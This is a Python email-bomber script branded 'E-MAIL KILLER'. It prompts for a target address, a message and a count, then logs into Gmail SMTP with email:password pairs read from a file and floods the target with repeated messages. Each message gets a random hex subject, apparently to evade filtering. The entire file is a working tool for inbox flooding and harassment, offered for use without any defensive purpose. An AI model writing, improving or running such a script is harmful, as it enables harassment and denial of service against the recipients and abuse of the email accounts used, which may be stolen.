# -*- coding: utf-8 -*-
import os
import smtplib
import sys
from time import sleep
from concurrent.futures import ThreadPoolExecutor, as_completed

# Temizleme komutu
os.system('clear' if os.name == 'posix' else 'cls')
print("""



oooooooooooo         ooo        ooooo       .o.       ooooo ooooo
`888'     `8         `88.       .888'      .888.      `888' `888'
 888                  888b     d'888      .8"888.      888   888
 888oooo8             8 Y88. .P  888     .8' `888.     888   888
 888    "    8888888  8  `888'   888    .88ooo8888.    888   888
 888       o          8    Y     888   .8'     `888.   888   888       o
o888ooooood8         o8o        o888o o88o     o8888o o888o o888ooooood8



oooo    oooo ooooo ooooo        ooooo        oooooooooooo ooooooooo.
`888   .8P'  `888' `888'        `888'        `888'     `8 `888   `Y88.
 888  d8'     888   888          888          888          888   .d88'
 88888[       888   888          888          888oooo8     888ooo88P'
 888`88b.     888   888          888          888    "     888`88b.
 888  `88b.   888   888       o  888       o  888       o  888  `88b.
o888o  o888o o888o o888ooooood8 o888ooooood8 o888ooooood8 o888o  o888o

-----------------------> Coder : @archescyber ❤️ <-----------------------
""")
print(" ")

# Alıcı e-posta ve mesaj bilgilerini kullanıcıdan alma
victime = input('\033[94m[?]\033[97m E-Mail\033[91m To Be Sent\033[97m : \033[93m')
print("")
message = input('\033[94m[?]\033[97m Message:\033[92m : \033[93m')
print(" ")
hani = int(input('\033[94m[?] \033[97mNumber Of \033[92mE-Mail\033[97m : \033[93m'))
print(" ")

# SMTP_SERVER bilgileri
smtp_server = 'smtp.gmail.com'
port = 587

def clean_text(text):
    # Temizleme fonksiyonu
    return ' '.join(text.split())                                                                                                                       
def send_email(email, passworde, victime, message, i):
    try:
        # SMTP Bağlantısını kur
        with smtplib.SMTP(smtp_server, port) as server:
            server.ehlo()
            server.starttls()
            server.ehlo()
            server.login(email, passworde)

            # E-postayı gönder
            subject = os.urandom(9).hex()
            msg = f'Sender: {email}\nSubject: {subject}\n\n{message}'
            server.sendmail(email, victime, msg)

        print(f"\033[94m[✓]\033[97m E-Mail Sending \033[92mCompleted.\033[97m :\033[93m {i+1}")
    except smtplib.SMTPAuthenticationError:
        print(f"\n\033[94m[•] \033[91mError: \033[97m")
        print(f'\033[94m[•]\033[97m • \033[93mUsername\033[97m or \033[93mPassword\033[97m incorrect: {email}')
        print("\033[94m[|] \033[97mTurn on two-step verification in email settings. Then, create an application called SMTP by typing the application password and use it with your e-mail address.")
    except Exception as e:
        print(f'\033[94m[|] \033[91mError: \033[97m{e}')

# Mail.txt dosyasını oku ve her bir satırı işleyerek e-posta gönder
try:
    with open('mail.txt', 'r', encoding='utf-8') as file:
        lines = [clean_text(line.strip()) for line in file.readlines()]

    valid_lines = [line for line in lines if ':' in line]  # Geçerli satırları filtrele

    if len(valid_lines) == 0:
        raise ValueError("No valid email:password lines found in 'mail.txt'")

    # E-posta ve parola çiftlerini döngüde kullanmak için bir liste oluştur
    email_password_pairs = [(line.split(':')[0], clean_text(line.split(':')[1])) for line in valid_lines]

    if len(email_password_pairs) == 0:
        raise ValueError("No valid email:password pairs found")

    # E-posta gönderim işlevini çağıran bir yardımcı işlev
    def process_email(i):
        email, passworde = email_password_pairs[i % len(email_password_pairs)]
        send_email(email, passworde, victime, message, i)
        sleep(0.001)  # Örneğin, her e-posta gönderiminden sonra 0.001 saniye bekle

    # ThreadPoolExecutor kullanarak e-posta gönderimlerini paralel hale getirme
    with ThreadPoolExecutor(max_workers=1) as executor:  # max_workers=1, her seferinde tek bir iş parçacığı kullanır
        futures = [executor.submit(process_email, i) for i in range(hani)]

        for future in as_completed(futures):
            future.result()  # Herhangi bir exception oluşursa burada yakalanır

    print("")
    print(f'\033[93m[✓]\033[97m All \033[97mMessages \033[92mSent.\033[97m ')

except FileNotFoundError:
    print("\033[94m[|] \033[91mError: \033[97m' mail.txt' not found.")
except Exception as e:
    print(f'\033[94m[|] \033[91mError: \033[97m{e}')
